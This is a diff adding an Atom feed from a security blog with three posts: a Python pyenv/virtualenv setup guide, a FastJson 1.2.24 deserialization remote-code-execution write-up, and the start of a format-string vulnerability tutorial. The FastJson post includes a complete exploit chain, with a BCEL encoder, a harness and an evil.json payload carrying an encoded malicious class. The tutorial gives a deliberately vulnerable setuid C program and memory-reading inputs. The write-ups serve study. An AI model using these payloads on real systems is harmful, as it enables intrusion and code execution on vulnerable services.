@@ -1,0 +1,962 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>M0rk&#39;s Blog</title>
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://kevien.github.io/"/>
+  <updated>2018-08-31T17:10:20.427Z</updated>
+  <id>http://kevien.github.io/</id>
+  
+  <author>
+    <name>M0rk</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>python虚拟环境安装和使用</title>
+    <link href="http://kevien.github.io/2018/07/15/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
+    <id>http://kevien.github.io/2018/07/15/python虚拟环境安装和使用/</id>
+    <published>2018-07-15T05:30:41.000Z</published>
+    <updated>2018-08-31T17:10:20.427Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>mac自带的python环境在有时会有第三方包冲突、python2和python3之间切换不方便以及第三方包安装需要root权限可能导致的安全问题等，所有就有了python虚拟环境，这里主要介绍pyenv以及virtualenv的安装和使用。<h4 id="pyenv安装和使用"><a href="#pyenv安装和使用" class="headerlink" title="pyenv安装和使用"></a>pyenv安装和使用</h4></li>
+<li><p>推荐使用brew安装pyenv </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># Install Homebrew</div><div class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; </div><div class="line"># Install pyenv</div><div class="line">brew install pyenv </div><div class="line"># Add pyenv initializer to shell startup script</div><div class="line"># ZSH USERS: use ~/.zshrc instead of ~/.bash_profile</div><div class="line"># LINUX USERS: use ~/.bashrc instead of ~/.bash_profile</div><div class="line">echo &apos;eval &quot;$(pyenv init -)&quot;&apos; &gt;&gt; ~/.bash_profile </div><div class="line"># Restart your shell for changes to take effect</div><div class="line">exec $SHELL</div></pre></td></tr></table></figure>
+</li>
+<li><p>使用pyenv install –list 查看可用的python版本</p>
+</li>
+<li>使用pyenv install  3.6.* 安装特定版本的python（建议安装个python2 和python3的环境即可）</li>
+<li>查看已安装的版本 pyenv versions<br><img src="/2018/07/15/python虚拟环境安装和使用/pyenvversions.png" alt=""></li>
+<li>python环境切换 使用pyenv global xxx 或者pyenv local ,其中前者是全局的设置，而后者是针对当前项目python环境的设置。<h4 id="配置pycharm"><a href="#配置pycharm" class="headerlink" title="配置pycharm"></a>配置pycharm</h4></li>
+<li>现实中我们往往可能需要使用pycharm这种IDE进行python的开发，那么如何在pycharm中进行python版本的自由切换呢？</li>
+<li>其实pycharm 和idea都属于 jetbrains家族产品，使用上面很是类似。</li>
+<li>打开一个项目，选择file-&gt; Default Settings-&gt; Python Interpreter-&gt; show ALL -&gt; +号 -&gt; Existing environment -&gt; 进行下拉框的选择就OK<br><img src="/2018/07/15/python虚拟环境安装和使用/setpycharm.png" alt=""></li>
+<li>之后就可以通过添加完的Python Interpreter选择对应版本的Interpreter进行解释执行了。<h4 id="virtualenv的安装和使用"><a href="#virtualenv的安装和使用" class="headerlink" title="virtualenv的安装和使用"></a>virtualenv的安装和使用</h4></li>
+<li>pyenv用于不同python版本之间的切换，还有一种场景就是在确定了python版本之后，需要第三方包不同版本之间的切换，比如不同版本的django版本之间的版本切换，于是就有了virutalenv。</li>
+<li><p>安装（还是brew）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># Install Homebrew</div><div class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</div><div class="line"># Install pyenv-virtualenv</div><div class="line">brew install pyenv-virtualenv</div><div class="line"># Add pyenv-virtualenv initializer to shell startup script</div><div class="line"># ZSH USERS: use ~/.zshrc instead of ~/.bash_profile</div><div class="line"># LINUX USERS: use ~/.bashrc instead of ~/.bash_profile</div><div class="line">echo &apos;eval &quot;$(pyenv virtualenv-init -)&quot;&apos; &gt;&gt; ~/.bash_profile</div><div class="line"># Restart your shell for changes to take effect</div><div class="line">exec $SHELL</div></pre></td></tr></table></figure>
+</li>
+<li><p>创建一个虚拟环境 例如 pyenv virtualenv 3.6.1 django-1.10</p>
+</li>
+<li>激活这个虚拟环境 例如 pyenv activate django-1.10</li>
+<li>安装对应版本的第三方包 pip install django==1.10<br><img src="/2018/07/15/python虚拟环境安装和使用/virtualenv.png" alt=""></li>
+<li>如上图所示，就相当于进一步定制化了环境（python2.7.14 and django==1.10）。</li>
+<li>此外和上面配置pycharm一样对pycharm进行相应开发环境的配置。</li>
+<li>退出当前的虚拟环境 pyenv deactivate xxx<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4>*<a href="https://medium.com/@jordanthomasg/python-development-on-macos-with-pyenv-virtualenv-ec583b92934c" target="_blank" rel="external">Python Development on macOS with pyenv-virtualenv</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;mac自带的python环境在有时会有第三方包冲突、python2和python3之间切换不方便以及第三
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>FastJson反序列化漏洞(续)</title>
+    <link href="http://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/"/>
+    <id>http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/</id>
+    <published>2018-06-17T18:47:07.000Z</published>
+    <updated>2018-06-28T06:55:02.822Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>之前写了篇fastjson反序列化漏洞的分析文章，见<a href="https://www.cnblogs.com/mrchang/p/6789060.html" target="_blank" rel="external">Fastjson反序列化漏洞研究</a>,最近<br>读了这篇文章<a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="external">DefineClass在Java反序列化当中的利用</a>深受启发，学习到了另外的利用姿势.本来很早就应该填的坑，因为一些其它事情导致现在才更 :(</li>
+<li>作者文章写的很好，只是有些点以及代码没有完全给出来，所以需要自己去测试。<h4 id="details"><a href="#details" class="headerlink" title="details"></a>details</h4></li>
+<li>在上面的文章中作者是利用了tomcat-dbcp.jar组件中org.apache.tomcat.dbcp.dbcp.BasicDataSource类的Class.forName()方法，关于Class.forName执行代码的方法，有两种（作者也在文章中介绍了），这个Class.forName是关键，它可以设置classLoader和classname，从而加载.class文件，恶意的.class中静态代码块儿static{}会执行。下面给出文章中一些缺少的代码。关于ClassLoader的机制可以参考@frozenme大佬的文章(很棒)：P<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">package FastJsonDemo;</div><div class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</div><div class="line"></div><div class="line">import java.nio.file.Files;</div><div class="line">import java.nio.file.Path;</div><div class="line">import java.nio.file.Paths;</div><div class="line"></div><div class="line">public class BCELencode &#123;</div><div class="line">    public static void main(String []args) throws Exception&#123;</div><div class="line">        //There also should be compiled class file,not java file</div><div class="line">        Path path = Paths.get(&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.class&quot;);</div><div class="line">        byte[] data = Files.readAllBytes(path);</div><div class="line">        String s =  Utility.encode(data,true);</div><div class="line">        System.out.print(s);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这里用于将evil.class文件进行BCEL编码。</p>
+<ul>
+<li><p>在作者的poc的基础上精简了一下，直接读取并反序列化外部json文件触发漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">package FastJsonDemo;</div><div class="line"></div><div class="line">import com.alibaba.fastjson.JSON;</div><div class="line">import com.sun.org.apache.bcel.internal.util.ClassLoader;</div><div class="line">import jdk.internal.dynalink.support.TypeUtilities;</div><div class="line"></div><div class="line">import java.io.IOException;</div><div class="line">import java.io.InputStream;</div><div class="line">import java.io.InputStreamReader;</div><div class="line">import java.io.FileInputStream;</div><div class="line">import java.io.BufferedReader;</div><div class="line"></div><div class="line"></div><div class="line">public class FastJsonPwn  &#123;</div><div class="line"></div><div class="line">    public static void readToBuffer(StringBuffer buffer, String filePath) throws IOException &#123;</div><div class="line">        InputStream is = new FileInputStream(filePath);</div><div class="line">        String line; // 用来保存每行读取的内容</div><div class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</div><div class="line">        line = reader.readLine(); // 读取第一行</div><div class="line">        while (line != null) &#123; // 如果 line 为空说明读完了</div><div class="line">            buffer.append(line); // 将读到的内容添加到 buffer 中</div><div class="line">            buffer.append(&quot;\n&quot;); // 添加换行符</div><div class="line">            line = reader.readLine(); // 读取下一行</div><div class="line">        &#125;</div><div class="line">        reader.close();</div><div class="line">        is.close();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception&#123;</div><div class="line">        String s = &quot;java.lang.Thread&quot;;</div><div class="line">        //long hash = TypeUtilities.fnv1a_64(s);</div><div class="line"></div><div class="line">        //Class.forName(&quot;FastJsonDemo.Run&quot;);</div><div class="line"></div><div class="line">//        String classname = &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;;</div><div class="line">//        ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();</div><div class="line">//        Class.forName(classname, true, cls);</div><div class="line">        //note  project must contain dbcp external lib</div><div class="line">//        String poc = &quot; &#123;\n&quot; +</div><div class="line">//                &quot;\t\t\t\&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot; +</div><div class="line">//                &quot;\t\t\t\&quot;driverClassLoader\&quot;: &#123;\n&quot; +</div><div class="line">//                &quot;\t\t\t\t\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</div><div class="line">//                &quot;\t\t\t&#125;,\n&quot; +</div><div class="line">//                &quot;\t\t\t\&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A\&quot;\n&quot; +</div><div class="line">//                &quot;\t\t&#125;\n&quot;;</div><div class="line">        StringBuffer Buffer = new StringBuffer();</div><div class="line">        FastJsonPwn.readToBuffer(Buffer,&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.json&quot;);</div><div class="line">        Object obj= JSON.parseObject(Buffer.toString());</div></pre></td></tr></table></figure>
+</li>
+<li><p>evil.json</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</div><div class="line">  &quot;driverClassLoader&quot; :</div><div class="line">  &#123;</div><div class="line">    &quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</div><div class="line">  &#125;,</div><div class="line">  &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/06/18/FastJson反序列化漏洞(续)/pwn.png" alt=""><br>其它可能用到的代码已经放到<a href="https://github.com/kevien/javacode" target="_blank" rel="external">github</a></p>
+<h4 id="about-patch"><a href="#about-patch" class="headerlink" title="about patch"></a>about patch</h4><ul>
+<li>笔者进行漏洞测试的版本是1.2.24，在17年12月11号，fastjson维护者更新了一段代码<a href="https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd" target="_blank" rel="external">github</a><br><img src="/2018/06/18/FastJson反序列化漏洞(续)/denylist.png" alt=""></li>
+<li>作者将原来的denyList改为denyHashCodes的方式进行黑名单拦截（最新版本依然采用这种方式），其中denyHashCode的计算方式略微复杂，增加了攻击门槛。<br><img src="/2018/06/18/FastJson反序列化漏洞(续)/calculatehash.png" alt=""><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4></li>
+<li>较Template攻击方式此攻击方式不需要设置Feature.SupportNonPublicField，但是需要外部的jar包（因为这个jar包和JDBC数据库连接相关，可能很多项目应该都使用了，所以影响也还是很大）。</li>
+<li>利用 defineClass 在运行时状态下，将我们精心构造的 class 文件加载进入 ClassLoader，通过<br>java 的 static{}特征，导致代码执行。</li>
+<li>此payload较之前的有个好处就是不需要受害者开启Feature.SupportNonPublicField这个‘特性‘。</li>
+<li>根据作者之前通过的denylist其实就可以知道这个漏洞的利用方式很多种，和python类似，java很多漏洞都还是绕denyList的问题。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li>
+<li><a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="external">DefineClass在Java反序列化当中的利用</a></li>
+<li><a href="https://threathunter.org/topic/5a49570eec721b1f1966f30f" target="_blank" rel="external">Evading Anti-Virus by using dynamic code generation and reflection</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;之前写了篇fastjson反序列化漏洞的分析文章，见&lt;a href=&quot;https://www.cnblo
+    
+    </summary>
+    
+    
+      <category term="java安全 RCE" scheme="http://kevien.github.io/tags/java%E5%AE%89%E5%85%A8-RCE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>格式化字符串漏洞</title>
+    <link href="http://kevien.github.io/2018/04/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://kevien.github.io/2018/04/07/格式化字符串漏洞/</id>
+    <published>2018-04-06T21:37:24.000Z</published>
+    <updated>2018-08-24T04:26:49.545Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，ctf的pwn中经常会遇到，这两天学习了一下，仅当笔记留以备忘。</li>
+<li>在了解格式化字符串漏洞之前还是应该先了解一下printf函数的基本功能。</li>
+<li>可以使用命令 man 3 printf 查看printf函数的功能介绍，其中printf是c语言中为数不多的支持可变参数的库函数。根据cdecl的函数调用规定，函数从最右边的参数开始，逐个压栈。如果要传入的是一个字符串，那么就将字符串的指针压栈。这一切都井井有条的进行着。如果是一般的函数，函数的调用者和被调用者都应该知道函数的参数个数以及每个参数的类型。但是对于像printf这种可变参数的函数来说，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数调用者传入的格式一个一个的打印出数据。</li>
+<li>测试环境ubuntuX86<h4 id="任意内存读取"><a href="#任意内存读取" class="headerlink" title="任意内存读取"></a>任意内存读取</h4></li>
+<li><p>如下是函数printf format的参数、输入类型以及输出类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">| Parameter  |  Input Type | Output Type                    |</div><div class="line">| - - - - - -| - - - - - - | - - - - - - - - - - - - - - -  |</div><div class="line">| %d         | Value       | Decimal                        |</div><div class="line">| %u         | Value       | Unsigned decimal               |</div><div class="line">| %x         | Value       | Hexadecimal                    |</div><div class="line">| %s         | Pointer     | String                         |</div><div class="line">| %n         | Pointer     | Number of bytes written so far |</div></pre></td></tr></table></figure>
+</li>
+<li><p>试想有这样一种情况，我们要求printf打印的数据数量大于我们所给的数量会怎样？printf函数不可能知道栈帧中哪一些数据是它传入的参数，哪些是属于函数调用者的数据。</p>
+</li>
+<li>vuln code<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#fmt_vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line">   char text[1024];</div><div class="line">   static int test_val = -72;</div><div class="line"></div><div class="line">   if(argc &lt; 2) &#123;</div><div class="line">      printf(&quot;Usage: %s &lt;text to print&gt;\n&quot;, argv[0]);</div><div class="line">      exit(0);</div><div class="line">   &#125;</div><div class="line">   strcpy(text, argv[1]);</div><div class="line"></div><div class="line">   printf(&quot;The right way to print user-controlled input:\n&quot;);</div><div class="line">   printf(&quot;%s&quot;, text);</div><div class="line"></div><div class="line"></div><div class="line">   printf(&quot;\nThe wrong way to print user-controlled input:\n&quot;);</div><div class="line">   printf(text);</div><div class="line"></div><div class="line">   printf(&quot;\n&quot;);</div><div class="line"></div><div class="line">   // Debug output</div><div class="line">   printf(&quot;[*] test_val @ 0x%08x = %d 0x%08x\n&quot;, &amp;test_val, test_val, test_val);</div><div class="line"></div><div class="line">   exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">编译指令：</div><div class="line">gcc -g fmt_vuln.c -o fmt_vuln</div><div class="line">sudo chown root fmt_vuln</div><div class="line">sudo chmod u+s fmt_vuln</div></pre></td></tr></table></figure>
+<ul>
+<li>当我们输入 AAAA%08x.%08x.%08x.%08x可以看到我们读取到了保存于栈中的数据（输入的AAAA），当然如果输入的%08x更多还会读取到栈中更多的数据<br><img src="/2018/04/07/格式化字符串漏洞/memread.png" alt=""></li>
+<li>如果写入的AAAA是一个敏感的地址呢，比如指向敏感字符串的地址。<br><img src="/2018/04/07/格式化字符串漏洞/readspecifyadd.png" alt=""><h4 id="任意内存写入"><a href="#任意内存写入" class="headerlink" title="任意内存写入"></a>任意内存写入</h4></li>
+<li>任意内存写入需要用到%n这个不常用的参数，它的功能是将%n之前printf已经打印的字符个数赋值给传入的指针,通过%n我们就可以修改内存中的值了。还是原来的漏洞代码。</li>
+<li><p>此外还需要$的配合，如下的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printf(&quot;7th: %7$d, 4th: %4$05d\n&quot;, 10, 20, 30, 40, 50, 60, 70, 80);</div></pre></td></tr></table></figure>
